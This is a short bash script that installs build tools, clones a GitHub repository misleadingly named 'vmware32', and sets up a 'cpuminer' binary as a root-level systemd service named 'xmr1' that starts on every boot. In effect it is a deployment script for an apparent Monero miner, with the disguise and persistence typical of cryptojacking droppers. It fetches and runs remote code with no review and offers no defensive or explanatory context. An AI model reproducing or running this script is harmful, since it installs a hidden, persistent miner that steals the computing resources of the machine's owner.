#!/bin/bash

yum -y update && yum -y install curl-devel openssl-devel gmp-devel automake autoconf pkg-config jansson-devel libssl-devel libgmp-devel make gcc git && cd /root/ &&  git clone https://github.com/nokian5500/vmware32.git cpu && cd cpu && chmod 777 cpuminer && chmod +x cpuminer && mv xmr1.service /etc/systemd/system/ && systemctl daemon-reload && systemctl enable xmr1.service && systemctl start xmr1.service

